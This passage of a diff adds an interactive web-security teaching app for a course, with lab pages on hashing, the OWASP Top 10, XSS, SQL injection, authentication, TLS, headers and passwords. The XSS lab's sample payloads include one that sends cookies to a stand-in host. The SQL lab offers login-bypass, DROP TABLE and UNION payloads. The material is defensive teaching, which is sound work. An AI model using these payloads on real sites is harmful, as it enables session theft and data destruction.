+        <div class="card-body">
+          <div class="fg"><label>Input Text</label><textarea id="hash-in" rows="3" placeholder="Enter any text...">Hello, CSC 434!</textarea></div>
+          <button class="btn btn-green" onclick="computeHash()">⚡ COMPUTE HASHES</button>
+          <div id="hash-outputs" style="margin-top:14px;"></div>
+          <div class="alert-info" style="margin-top:12px;"><span>ℹ️</span><div>A single character change completely transforms the hash — this is the <strong>avalanche effect</strong>. Try changing one letter!</div></div>
+        </div>
+      </div>
+      <div class="card card-top-red">
+        <div class="card-head"><div class="card-title">📖 HASH ALGORITHMS COMPARISON</div></div>
+        <div class="card-body">
+          <table style="width:100%;border-collapse:collapse;font-size:12px;">
+            <thead><tr style="background:var(--s3);">
+              <th style="padding:8px 12px;color:var(--gray);border:1px solid var(--border);text-align:left;">Algorithm</th>
+              <th style="padding:8px 12px;color:var(--gray);border:1px solid var(--border);">Output</th>
+              <th style="padding:8px 12px;color:var(--gray);border:1px solid var(--border);">Status</th>
+            </tr></thead>
+            <tbody>
+              ${[['MD5','128-bit (32 hex)','⚠️ BROKEN'],['SHA-1','160-bit (40 hex)','⚠️ BROKEN'],['SHA-256','256-bit (64 hex)','✓ SECURE'],['SHA-512','512-bit (128 hex)','✓ SECURE'],['bcrypt','60 chars','✓ PASSWORD OK'],['Argon2','Variable','✓ RECOMMENDED']].map(([n,s,st])=>`
+              <tr><td style="padding:10px 12px;border:1px solid var(--border);color:var(--white);font-weight:600;font-family:'Share Tech Mono',monospace;">${n}</td>
+              <td style="padding:10px 12px;border:1px solid var(--border);color:var(--gray);font-family:'Share Tech Mono',monospace;text-align:center;">${s}</td>
+              <td style="padding:10px 12px;border:1px solid var(--border);color:${st.includes('✓')?'var(--green)':'var(--orange)'};text-align:center;font-size:11px;font-weight:700;">${st}</td></tr>`).join('')}
+            </tbody>
+          </table>
+          <div class="sec-title" style="margin-top:16px;">Hash Properties</div>
+          <div style="font-size:12px;color:var(--gray);line-height:2.1;">
+            <span style="color:var(--cyan)">Deterministic:</span> Same input → always same output<br>
+            <span style="color:var(--green)">One-way:</span> Cannot recover input from hash<br>
+            <span style="color:var(--orange)">Avalanche effect:</span> 1 bit change → 50% output change<br>
+            <span style="color:var(--violet)">Collision resistant:</span> Hard to find two inputs with same hash
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ OWASP TOP 10 ════════════════════════════════ -->
+  <div class="page" id="page-owasp">
+    <div class="card card-top-red" style="margin-bottom:18px;">
+      <div class="card-head">
+        <div><div class="card-title">⚠️ OWASP TOP 10 — CRITICAL WEB VULNERABILITIES (2021)</div><div class="card-sub">The Open Web Application Security Project's most critical application security risks</div></div>
+        <span class="badge badge-crit">🔴 CRITICAL KNOWLEDGE</span>
+      </div>
+      <div class="card-body">
+        <table class="owasp">
+          <thead><tr><th>Rank</th><th>Vulnerability</th><th>Description</th><th>Example</th><th>Prevention</th><th>Risk</th></tr></thead>
+          <tbody>
+            ${[
+              ['A01','Broken Access Control','Restrictions on authenticated users not properly enforced','User changes /account/123 to /account/124','Implement RBAC, check auth on every request','CRITICAL'],
+              ['A02','Cryptographic Failures','Weak/missing encryption of sensitive data in transit or at rest','Storing passwords as MD5 or plaintext','Use TLS 1.3, bcrypt/Argon2, encrypt all PII','HIGH'],
+              ['A03','Injection (SQL/XSS/etc)','Untrusted data sent to interpreter as part of command','OR 1=1-- in SQL field logs in as admin','Parameterized queries, input validation, WAF','CRITICAL'],
+              ['A04','Insecure Design','Missing or ineffective security controls in architecture','No rate limiting on login allows brute force','Threat modeling, secure design patterns','HIGH'],
+              ['A05','Security Misconfiguration','Improperly configured servers, default credentials','Admin:admin123 still works after deployment','Harden configs, disable defaults, use CIS','HIGH'],
+              ['A06','Vulnerable Components','Using libraries/frameworks with known vulnerabilities','Log4Shell in Apache Log4j (CVE-2021-44228)','Track dependencies, patch promptly','HIGH'],
+              ['A07','Auth & Session Failures','Broken authentication — weak passwords, exposed sessions','Session token in URL, no logout','JWT, secure cookies, MFA, account lockout','HIGH'],
+              ['A08','Data Integrity Failures','Code and data without integrity verification, bad CI/CD','Auto-update downloads unsigned package','Digital signatures, code review, SBOM','MEDIUM'],
+              ['A09','Logging & Monitoring Failures','No visibility into attacks when they occur','Breach undetected for 200+ days','Centralized logging, SIEM, alerting','MEDIUM'],
+              ['A10','Server-Side Request Forgery','Server fetches external resource from user-controlled URL','Server fetches http://internal-api/admin','Allowlist destinations, disable redirects','HIGH'],
+            ].map(([rank,name,desc,ex,prev,risk])=>`<tr>
+              <td><span class="owasp-rank">${rank}</span></td>
+              <td><span class="owasp-name">${name}</span></td>
+              <td style="font-size:11.5px;">${desc}</td>
+              <td style="font-family:'Share Tech Mono',monospace;font-size:10.5px;color:var(--orange);">${ex}</td>
+              <td style="font-size:11px;color:var(--green);">${prev}</td>
+              <td><span class="badge ${risk==='CRITICAL'?'badge-crit':risk==='HIGH'?'badge-warn':'badge-info'}">${risk}</span></td>
+            </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ XSS PAGE ═══════════════════════════════════ -->
+  <div class="page" id="page-xss">
+    <div class="g2">
+      <div class="card card-top-red">
+        <div class="card-head"><div><div class="card-title">💉 XSS — CROSS-SITE SCRIPTING LAB</div><div class="card-sub">Simulate XSS attack vectors and see why input sanitization is critical</div></div></div>
+        <div class="card-body">
+          <div class="fg">
+            <label>Test XSS Payload (Input)</label>
+            <textarea id="xss-in" rows="3" placeholder="Try XSS payloads..."><script>alert('XSS!')</script></textarea>
+          </div>
+          <div style="display:flex;gap:10px;margin-bottom:12px;">
+            <button class="btn btn-red btn-sm" onclick="xssDemo('unsafe')">⚠️ Unsafe Render (VULNERABLE)</button>
+            <button class="btn btn-green btn-sm" onclick="xssDemo('safe')">✅ Safe Render (PROTECTED)</button>
+          </div>
+
+          <div class="sec-title">Common Payloads</div>
+          <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;">
+            ${[
+              `<script>alert('XSS!')<\/script>`,
+              `<img src=x onerror=alert(1)>`,
+              `<svg onload=alert(1)>`,
+              `javascript:alert(1)`,
+              `"><script>fetch('evil.com?c='+document.cookie)<\/script>`
+            ].map(p=>`<button class="btn btn-ghost btn-sm" style="font-family:'Share Tech Mono',monospace;font-size:10px;" onclick="document.getElementById('xss-in').value=this.getAttribute('data-p')" data-p="${p.replace(/"/g,'&quot;')}">${p.substring(0,30)}...</button>`).join('')}
+          </div>
+          <div id="xss-output"></div>
+        </div>
+      </div>
+      <div class="card card-top-green">
+        <div class="card-head"><div class="card-title">🛡️ XSS PREVENTION TECHNIQUES</div></div>
+        <div class="card-body">
+          <div class="sec-title">1. Input Sanitization</div>
+          <div class="code-block"><span class="c-cmt">// ❌ VULNERABLE — Never do this</span>
+<span class="c-kw">const</span> html = <span class="c-str">`&lt;div&gt;${userInput}&lt;/div&gt;`</span>;
+element.<span class="c-fn">innerHTML</span> = html;
+
+<span class="c-cmt">// ✅ SAFE — Use textContent</span>
+element.<span class="c-fn">textContent</span> = userInput;
+
+<span class="c-cmt">// ✅ SAFE — Sanitize HTML</span>
+<span class="c-kw">const</span> clean = DOMPurify.<span class="c-fn">sanitize</span>(userInput);</div>
+
+          <div class="sec-title" style="margin-top:14px;">2. Content Security Policy Header</div>
+          <div class="code-block"><span class="c-cmt">// Add to HTTP response headers</span>
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self' 'nonce-abc123';
+  style-src 'self';
+  img-src 'self' data: https:;
+  frame-ancestors 'none';</div>
+
+          <div class="sec-title" style="margin-top:14px;">3. Types of XSS</div>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <div style="background:var(--s3);border:1px solid rgba(255,51,85,.2);border-left:3px solid var(--red);border-radius:0 6px 6px 0;padding:10px;">
+              <div style="font-size:12px;font-weight:700;color:var(--red);">Reflected XSS</div>
+              <div style="font-size:11px;color:var(--gray);margin-top:3px;">Script in URL, executed when user clicks malicious link</div>
+            </div>
+            <div style="background:var(--s3);border:1px solid rgba(255,51,85,.2);border-left:3px solid var(--orange);border-radius:0 6px 6px 0;padding:10px;">
+              <div style="font-size:12px;font-weight:700;color:var(--orange);">Stored XSS</div>
+              <div style="font-size:11px;color:var(--gray);margin-top:3px;">Script saved in DB, executes for every user who views it</div>
+            </div>
+            <div style="background:var(--s3);border:1px solid rgba(255,51,85,.2);border-left:3px solid var(--violet);border-radius:0 6px 6px 0;padding:10px;">
+              <div style="font-size:12px;font-weight:700;color:var(--violet);">DOM-based XSS</div>
+              <div style="font-size:11px;color:var(--gray);margin-top:3px;">Script modifies the DOM client-side without touching server</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ SQL INJECTION PAGE ═════════════════════════ -->
+  <div class="page" id="page-sqli">
+    <div class="g2">
+      <div class="card card-top-red">
+        <div class="card-head"><div><div class="card-title">🗄️ SQL INJECTION LAB</div><div class="card-sub">See how SQL injection bypasses authentication and extracts data</div></div></div>
+        <div class="card-body">
+          <div class="fg"><label>Username</label><input id="sqli-user" value="admin" placeholder="Enter username"></div>
+          <div class="fg"><label>Password</label><input id="sqli-pass" value="' OR '1'='1" placeholder="Enter password"></div>
+          <div style="margin-bottom:12px;">
+            <div class="sec-title">Attack Payloads to Try</div>
+            <div style="display:flex;flex-wrap:wrap;gap:6px;">
+              ${[["Normal Login","admin","password123"],["Bypass Auth","admin","' OR '1'='1"],["Drop Table","'; DROP TABLE users;--","any"],["Comment Out","admin'--","any"],["Union Attack","' UNION SELECT * FROM users--","any"]].map(([label,u,p])=>`<button class="btn btn-ghost btn-sm" style="font-size:10.5px;" onclick="document.getElementById('sqli-user').value='${u}';document.getElementById('sqli-pass').value='${p}';sqliDemo()">${label}</button>`).join('')}
+            </div>
+          </div>
+          <button class="btn btn-red" onclick="sqliDemo()">💉 EXECUTE QUERY</button>
+          <div id="sqli-output" style="margin-top:14px;"></div>
+        </div>
+      </div>
+      <div class="card card-top-green">
+        <div class="card-head"><div class="card-title">🛡️ SQL INJECTION PREVENTION</div></div>
+        <div class="card-body">
+          <div class="sec-title">❌ Vulnerable Code</div>
+          <div class="code-block" style="border-color:rgba(255,51,85,.3);">
+<span class="c-cmt">-- DANGEROUS: String concatenation</span>
+<span class="c-kw">const</span> query = <span class="c-str">`SELECT * FROM users
+  WHERE username = '${username}'
+  AND password = '${password}'`</span>;
+
+<span class="c-cmt">-- Attacker enters: ' OR '1'='1</span>
+<span class="c-cmt">-- Query becomes:</span>
+SELECT * FROM users
+  <span class="c-kw">WHERE</span> username = <span class="c-str">'admin'</span>
+  <span class="c-kw">AND</span> password = <span class="c-str">'' OR '1'='1'</span>;
+<span class="c-cmt">-- Returns ALL rows → Auth bypassed!</span></div>
+
+          <div class="sec-title" style="margin-top:14px;">✅ Parameterized Queries</div>
+          <div class="code-block" style="border-color:rgba(0,255,136,.2);">
+<span class="c-cmt">-- SAFE: Parameterized query (Node.js)</span>
+<span class="c-kw">const</span> query = <span class="c-str">`SELECT * FROM users
+  WHERE username = ? AND password = ?`</span>;
+db.<span class="c-fn">query</span>(query, [username, passwordHash]);
+
+<span class="c-cmt">-- Parameters are NEVER interpreted as SQL</span>
+<span class="c-cmt">-- Input is always treated as literal data</span>
+
+<span class="c-cmt">-- Also: Use ORM (Sequelize, Prisma)</span>
+<span class="c-kw">const</span> user = <span class="c-kw">await</span> User.<span class="c-fn">findOne</span>({
+  where: { username, password: hash }
+});</div>
+          <div class="alert-crit" style="margin-top:10px;"><span>🚨</span><div>SQL injection was responsible for 65% of web application attacks. Always use parameterized queries — NEVER concatenate user input into SQL!</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ AUTHENTICATION PAGE ════════════════════════ -->
+  <div class="page" id="page-auth">
+    <div class="g2">
+      <div class="card card-top-orange">
+        <div class="card-head"><div><div class="card-title">🔐 SECURE LOGIN SIMULATOR</div><div class="card-sub">A properly secured authentication implementation demo</div></div></div>
+        <div class="card-body">
+          <div class="fg"><label>Username</label><input id="auth-user" placeholder="Enter username" value="admin"></div>
+          <div class="fg">
+            <label>Password</label>
+            <div style="position:relative;">
+              <input type="password" id="auth-pass" placeholder="Enter password" oninput="checkPwdStrength(this.value)" value="SecureP@ss123!">
+              <button onclick="togglePwd('auth-pass')" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--gray);font-size:14px;">👁</button>
+            </div>
+            <div class="pwd-meter"><div class="pwd-fill" id="pwd-fill" style="width:0%;background:var(--red);"></div></div>
+            <div style="font-size:11px;color:var(--gray);margin-top:4px;" id="pwd-strength-text">Enter password to check strength</div>
+          </div>
+          <div class="fg"><label>MFA Code (Demo: enter 123456)</label><input id="auth-mfa" placeholder="6-digit code" maxlength="6" value="123456"></div>
+          <button class="btn btn-green" onclick="authLogin()">🔑 LOGIN</button>
+          <div id="auth-output" style="margin-top:14px;"></div>
+
+          <div style="margin-top:16px;">
+            <div class="sec-title">Test Credentials</div>
+            <div class="code-block" style="font-size:11px;">admin / SecureP@ss123! + MFA: 123456  → ✅ LOGIN OK
+admin / wrongpass                      → ❌ REJECTED
+admin / SecureP@ss123! + MFA: 000000   → ❌ MFA FAILED
+hacker / ' OR 1=1--                    → ❌ BLOCKED</div>
+          </div>
+        </div>
+      </div>
+      <div class="card card-top-cyan">
+        <div class="card-head"><div class="card-title">📘 AUTHENTICATION CONCEPTS</div></div>
+        <div class="card-body">
+          <div class="sec-title">JWT Token Structure</div>
+          <div class="code-block" style="font-size:10.5px;">
+Header.Payload.Signature
+
+eyJhbGciOiJIUzI1NiJ9          ← Header (Base64)
+  { alg: "HS256", typ: "JWT" }
+
+eyJ1c2VyIjoiYWRtaW4ifQ         ← Payload (Base64)
+  { user: "admin", role: "admin",
+    iat: 1700000000, exp: 1700086400 }
+
+HMACSHA256(base64(h)+'.'+base64(p), secret)
+  ← Signature — verifies authenticity</div>
+
+          <div class="sec-title" style="margin-top:14px;">Security Checklist</div>
+          <div style="display:flex;flex-direction:column;gap:7px;">
+            ${[['✅','Hash passwords with bcrypt/Argon2 (never plaintext)','var(--green)'],['✅','Use HTTPS — never transmit credentials over HTTP','var(--green)'],['✅','Implement account lockout after N failed attempts','var(--green)'],['✅','Multi-factor authentication (MFA/2FA)','var(--green)'],['✅','Set HttpOnly, Secure, SameSite cookie flags','var(--green)'],['✅','Validate & sanitize all inputs server-side','var(--green)'],['❌','Store passwords in plain text','var(--red)'],['❌','Use MD5 or SHA-1 for password hashing','var(--red)'],['❌','Use session tokens in URL parameters','var(--red)']].map(([ic,text,col])=>`<div style="display:flex;gap:8px;padding:7px 10px;background:var(--s3);border:1px solid var(--border);border-radius:6px;font-size:11.5px;">
+              <span>${ic}</span><span style="color:${col};">${text}</span>
+            </div>`).join('')}
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ HTTPS / TLS PAGE ═══════════════════════════ -->
+  <div class="page" id="page-https">
+    <div class="card card-top-cyan">
+      <div class="card-head"><div><div class="card-title">🔒 HTTPS & SSL/TLS PROTOCOL</div><div class="card-sub">How TLS secures communications between client and server</div></div></div>
+      <div class="card-body">
+        <div class="g2">
+          <div>
+            <div class="sec-title">TLS Handshake Process</div>
+            <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px;">
+              ${[
+                ['1','ClientHello','Client sends supported TLS versions, cipher suites, random nonce','var(--cyan)'],
+                ['2','ServerHello','Server selects TLS version, cipher suite, sends certificate','var(--green)'],
+                ['3','Certificate Verify','Client verifies server certificate against trusted CA store','var(--orange)'],
+                ['4','Key Exchange','Diffie-Hellman: both parties derive the same session key','var(--violet)'],
+                ['5','Finished','Both parties send encrypted "finished" message — secure channel established!','var(--green)'],
+              ].map(([n,title,desc,col])=>`<div style="display:flex;gap:10px;background:var(--s2);border:1px solid var(--border);border-left:3px solid ${col};border-radius:0 8px 8px 0;padding:10px 14px;">
+                <div style="font-family:'Share Tech Mono',monospace;font-size:16px;font-weight:700;color:${col};min-width:20px;">${n}</div>
+                <div><div style="font-size:12.5px;font-weight:700;color:${col};">${title}</div><div style="font-size:11px;color:var(--gray);margin-top:3px;">${desc}</div></div>
+              </div>`).join('')}
+            </div>
+          </div>
+          <div>
+            <div class="sec-title">HTTP vs HTTPS Comparison</div>
+            <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:14px;">
+              <thead><tr style="background:var(--s3);">
+                <th style="padding:8px 12px;text-align:left;color:var(--gray);border:1px solid var(--border);">Feature</th>
+                <th style="padding:8px 12px;text-align:center;color:var(--red);border:1px solid var(--border);">HTTP</th>
+                <th style="padding:8px 12px;text-align:center;color:var(--green);border:1px solid var(--border);">HTTPS</th>
+              </tr></thead>
+              <tbody>
+                ${[['Encryption','❌ None','✅ TLS 1.3'],['Authentication','❌ None','✅ Certificates'],['Data Integrity','❌ Mutable','✅ HMAC'],['Port','80','443'],['SEO Impact','Penalized','Favored by Google'],['Cookie Security','Exposed','Secure flag'],['MITM Attack','Vulnerable','Protected']].map(([f,h,hs])=>`<tr><td style="padding:8px 12px;border:1px solid var(--border);color:var(--white);">${f}</td><td style="padding:8px 12px;border:1px solid var(--border);color:var(--red);text-align:center;">${h}</td><td style="padding:8px 12px;border:1px solid var(--border);color:var(--green);text-align:center;">${hs}</td></tr>`).join('')}
+              </tbody>
+            </table>
+            <div class="sec-title">Cipher Suites (TLS 1.3)</div>
+            <div class="code-block" style="font-size:10.5px;">TLS_AES_128_GCM_SHA256
+TLS_AES_256_GCM_SHA384
+TLS_CHACHA20_POLY1305_SHA256
+
+Format: TLS_[KeyExch]_[Auth]_[Cipher]_[Hash]
+
+RSA-2048 or ECDHE for key exchange
+AES-256 for symmetric encryption
+SHA-256 for message authentication</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ SECURITY HEADERS PAGE ══════════════════════ -->
+  <div class="page" id="page-headers">
+    <div class="card card-top-violet">
+      <div class="card-head"><div><div class="card-title">📋 HTTP SECURITY HEADERS SCANNER</div><div class="card-sub">Security headers that every web application must implement</div></div></div>
+      <div class="card-body">
+        <div class="g2" style="margin-bottom:20px;">
+          <div>
+            <div class="fg"><label>Simulate URL to Scan</label><input id="header-url" value="https://mywebapp.com" placeholder="Enter URL..."></div>
+            <button class="btn btn-green" onclick="scanHeaders()">🔍 SCAN HEADERS</button>
+            <div id="header-scan-result" style="margin-top:14px;"></div>
+          </div>
+          <div>
+            <div class="sec-title">Quick Profiles</div>
+            <div style="display:flex;flex-direction:column;gap:8px;">
+              <button class="btn btn-ghost" onclick="loadHeaderProfile('secure')">✅ Secure Site Profile</button>
+              <button class="btn btn-ghost" onclick="loadHeaderProfile('partial')">⚠️ Partial Security</button>
+              <button class="btn btn-ghost" onclick="loadHeaderProfile('insecure')">❌ Insecure Site Profile</button>
+            </div>
+          </div>
+        </div>
+        <div class="sec-title">All Security Headers Explained</div>
+        <table class="owasp" style="font-size:12px;">
+          <thead><tr><th>Header</th><th>Example Value</th><th>Purpose</th><th>Status</th></tr></thead>
+          <tbody id="headers-table">
+            ${[
+              ['Content-Security-Policy','default-src \'self\'','Prevents XSS by controlling resource origins','CRITICAL'],
+              ['Strict-Transport-Security','max-age=31536000; includeSubDomains','Forces HTTPS — prevents downgrade attacks','HIGH'],
+              ['X-Frame-Options','DENY','Prevents clickjacking via iframes','HIGH'],
+              ['X-Content-Type-Options','nosniff','Prevents MIME-type sniffing attacks','MEDIUM'],
+              ['Referrer-Policy','strict-origin-when-cross-origin','Controls what referrer info is shared','MEDIUM'],
+              ['Permissions-Policy','camera=(), microphone=()','Restricts browser feature access','MEDIUM'],
+              ['X-XSS-Protection','1; mode=block','Legacy XSS filter for older browsers','LOW'],
+            ].map(([h,v,p,sev])=>`<tr>
+              <td style="font-family:'Share Tech Mono',monospace;color:var(--cyan);font-size:11.5px;">${h}</td>
+              <td style="font-family:'Share Tech Mono',monospace;font-size:10.5px;color:var(--green);">${v}</td>
+              <td>${p}</td>
+              <td><span class="badge ${sev==='CRITICAL'?'badge-crit':sev==='HIGH'?'badge-warn':sev==='MEDIUM'?'badge-info':'badge-safe'}">${sev}</span></td>
+            </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ PASSWORD SECURITY PAGE ═════════════════════ -->
+  <div class="page" id="page-password">
+    <div class="g2">
+      <div class="card card-top-green">
+        <div class="card-head"><div><div class="card-title">🔏 PASSWORD STRENGTH ANALYZER</div></div></div>
+        <div class="card-body">
+          <div class="fg">
+            <label>Enter Password to Analyze</label>
+            <div style="position:relative;">
+              <input type="password" id="pwd-test" placeholder="Enter any password..." oninput="analyzePassword(this.value)" value="P@ssw0rd!">
+              <button onclick="togglePwd('pwd-test')" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--gray);">👁</button>
+            </div>
+            <div class="pwd-meter" style="margin-top:8px;height:8px;"><div class="pwd-fill" id="main-pwd-fill" style="width:0%;background:var(--red);"></div></div>
+            <div style="font-size:12px;color:var(--gray);margin-top:5px;" id="main-pwd-label">Analyzing...</div>
+          </div>
+          <div id="pwd-checks" style="margin-top:12px;"></div>
+          <div style="margin-top:16px;">
+            <div class="sec-title">Crack Time Estimate</div>
+            <div class="code-block" style="font-size:12px;" id="crack-time">Enter a password to see crack time estimate</div>
+          </div>
+          <button class="btn btn-ghost" style="margin-top:12px;" onclick="genStrongPwd()">⚡ GENERATE STRONG PASSWORD</button>
+          <div id="gen-pwd-output" style="margin-top:10px;"></div>
+        </div>
+      </div>
+      <div class="card card-top-red">
+        <div class="card-head"><div class="card-title">📊 WORST PASSWORDS & ATTACKS</div></div>
+        <div class="card-body">
+          <div class="sec-title">Top 10 Most Common (NEVER USE)</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:14px;">
+            ${['123456','password','123456789','12345678','12345','111111','1234567','sunshine','qwerty','iloveyou'].map((p,i)=>`<div style="background:var(--s3);border:1px solid rgba(255,51,85,.15);border-radius:6px;padding:7px 12px;display:flex;align-items:center;gap:8px;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);">${i+1}.</span>
+              <span style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--red);">${p}</span>
+            </div>`).join('')}
+          </div>
+          <div class="sec-title">Attack Methods</div>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            ${[
+              ['Dictionary Attack','Tries words from wordlists (rockyou.txt has 14M passwords)','var(--red)'],
+              ['Brute Force','Tries every character combination — slow but guaranteed','var(--orange)'],
+              ['Rainbow Tables','Pre-computed hash tables — defeated by salting','var(--orange)'],
+              ['Credential Stuffing','Reuses leaked username/password pairs from breaches','var(--red)'],
+              ['Phishing','Tricks user into entering credentials on fake site','var(--red)'],
+            ].map(([t,d,c])=>`<div style="background:var(--s3);border:1px solid var(--border);border-left:3px solid ${c};border-radius:0 6px 6px 0;padding:10px 12px;">
+              <div style="font-size:12px;font-weight:700;color:${c};">${t}</div>
+              <div style="font-size:11px;color:var(--gray);margin-top:3px;">${d}</div>
+            </div>`).join('')}
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </div><!-- end content -->
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ══ CLOCK ═══
+setInterval(()=>{
+  const now=new Date();
+  document.getElementById('clock').textContent=now.toLocaleTimeString();
+},1000);
+
+// ══ NAVIGATION ════════════════════════════════════════
+function navigate(page, el) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+page).classList.add('active');
+  if(el) el.classList.add('active');
+
+  const meta = {
+    home:['SECURITY DASHBOARD','CSC 434: Web Design and Data Security — Interactive Lab'],
+    caesar:['CAESAR CIPHER','Substitution cipher — shift-based classical cryptography'],
+    vigenere:['VIGENÈRE CIPHER','Polyalphabetic substitution using a repeating keyword'],
+    xor:['XOR ENCRYPTION','Bitwise XOR stream cipher — foundation of symmetric encryption'],
+    hashing:['HASH FUNCTIONS','One-way cryptographic transformations — MD5, SHA-1, SHA-256'],
+    owasp:['OWASP TOP 10','Critical web application security risks (2021 edition)'],
+    xss:['XSS — CROSS-SITE SCRIPTING','Attack simulation and prevention techniques'],
+    sqli:['SQL INJECTION LAB','Database attack patterns and parameterized query defense'],
+    auth:['AUTHENTICATION & SESSIONS','Secure login, JWT tokens, MFA, session management'],
+    https:['HTTPS & SSL/TLS PROTOCOL','Transport security, certificate chains, cipher suites'],
+    headers:['HTTP SECURITY HEADERS','Essential response headers every web app must send'],
+    password:['PASSWORD SECURITY','Strength analysis, attack methods, secure storage'],
+  };
+  const [t,s]=meta[page]||['CipherShield',''];
+  document.getElementById('page-title').textContent=t;
+  document.getElementById('page-sub').textContent=s;
+
+  const danger=['xss','sqli','owasp'];
+  document.getElementById('sys-status').textContent = danger.includes(page) ? '⚠ THREAT ANALYSIS MODE' : '🟢 SYSTEM SECURE';
+
+  if(page==='caesar'){setTimeout(()=>{updateCaesarShift();caesarProcess();buildFreqChart();},50);}
+  if(page==='vigenere'){setTimeout(()=>{vigenereProcess(true);},50);}
+  if(page==='xor'){setTimeout(()=>{xorProcess(true);},50);}
+  if(page==='hashing'){setTimeout(()=>{computeHash();},50);}
+  if(page==='auth'){setTimeout(()=>{checkPwdStrength(document.getElementById('auth-pass').value);},50);}
+  if(page==='password'){setTimeout(()=>{analyzePassword('P@ssw0rd!');},50);}
+}
+
+function showToast(msg, danger=false) {
+  const t=document.getElementById('toast');
+  t.textContent=msg;
+  t.className='toast'+(danger?' danger':'');
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2800);
+}
+
+// ══ CAESAR CIPHER ═════════════════════════════════════
+function updateCaesarShift() {
+  const v=document.getElementById('caesar-shift').value;
+  document.getElementById('shift-display').textContent=v;
+  document.getElementById('shift-table-val').textContent=v;
+  buildShiftTable(parseInt(v));
+}
+
+function buildShiftTable(shift) {
+  const alpha='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  let html='<div style="margin-bottom:4px;color:var(--gray);">Plain: </div><div style="color:var(--gray);letter-spacing:2px;">'+alpha.split('').join(' ')+'</div>';
+  html+='<div style="margin:4px 0;color:var(--muted);">Cipher:</div>';
+  const shifted=alpha.split('').map(c=>alpha[(alpha.indexOf(c)+shift)%26]).join(' ');
+  html+=`<div style="color:var(--green);letter-spacing:2px;">${shifted}</div>`;
+  document.getElementById('shift-table').innerHTML=html;
+}
+
+function caesarEncrypt(text, shift) {
+  return text.toUpperCase().split('').map(c=>{
+    if(!/[A-Z]/.test(c)) return c;
+    return String.fromCharCode(((c.charCodeAt(0)-65+shift)%26)+65);
+  }).join('');
+}
+
+function caesarProcess() {
+  const text=document.getElementById('caesar-in').value;
+  const shift=parseInt(document.getElementById('caesar-shift').value);
+  document.getElementById('caesar-out').textContent=caesarEncrypt(text,shift);
+  buildFreqChart();
+}
+
+function caesarDecrypt() {
+  const text=document.getElementById('caesar-in').value;
+  const shift=parseInt(document.getElementById('caesar-shift').value);
+  document.getElementById('caesar-out').textContent=caesarEncrypt(text,26-shift);
+}
+
+function buildFreqChart() {
+  const cipher=document.getElementById('caesar-out').textContent.toUpperCase().replace(/[^A-Z]/g,'');
+  const freq={};
+  for(const c of cipher) freq[c]=(freq[c]||0)+1;
+  const max=Math.max(...Object.values(freq),1);
+  const el=document.getElementById('freq-analysis');
+  if(!el) return;
+  const alpha='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  el.innerHTML=alpha.split('').map(c=>{
+    const count=freq[c]||0;
+    const pct=Math.round(count/Math.max(cipher.length,1)*100);
+    return `<div style="display:flex;flex-direction:column;align-items:center;width:28px;">
+      <div style="width:16px;background:linear-gradient(180deg,var(--${count?'green':'muted'}),transparent);height:${Math.max(count/max*60,2)}px;border-radius:2px 2px 0 0;"></div>
+      <div style="font-size:9px;font-family:'Share Tech Mono',monospace;color:var(--gray);margin-top:2px;">${c}</div>
+      <div style="font-size:8px;font-family:'Share Tech Mono',monospace;color:var(--muted);">${pct?pct+'%':''}</div>
+    </div>`;
+  }).join('');
+}
+
+// ══ VIGENÈRE ══════════════════════════════════════════
+function vigenereProcess(encrypt) {
+  const text=(document.getElementById('vig-in').value||'').toUpperCase().replace(/[^A-Z]/g,'');
+  const key=(document.getElementById('vig-key').value||'KEY').toUpperCase().replace(/[^A-Z]/g,'');
+  if(!text||!key){document.getElementById('vig-out').textContent='Enter text and key';return;}
+  let result='',vis='<div style="font-size:11px;">';
+  for(let i=0;i<text.length;i++){
+    const p=text.charCodeAt(i)-65;
+    const k=key.charCodeAt(i%key.length)-65;
+    const c=encrypt?(p+k)%26:((p-k+26)%26);
+    const ch=String.fromCharCode(c+65);
+    result+=ch;
+    if(i<8) vis+=`<span style="color:var(--gray)">${text[i]}</span><span style="color:var(--muted)">(${p})</span><span style="color:var(--cyan)">+${key[i%key.length]}(${k})</span>=<span style="color:var(--green)">${ch}</span>  `;
+  }
+  if(text.length>8) vis+=`<span style="color:var(--muted)">...+${text.length-8} more</span>`;
+  vis+='</div>';
+  document.getElementById('vig-out').textContent=result;
+  document.getElementById('vig-visual').innerHTML=vis;
+}
+
+// ══ XOR ════════════════════════════════════════════════
+function xorProcess(toHex) {
+  const text=document.getElementById('xor-in').value;
+  const key=document.getElementById('xor-key').value||'KEY';
+  if(toHex){
+    const bytes=text.split('').map((c,i)=>c.charCodeAt(0)^key.charCodeAt(i%key.length));
+    const hex=bytes.map(b=>b.toString(16).padStart(2,'0')).join(' ');
+    document.getElementById('xor-out').textContent=hex;
+    let bits='';
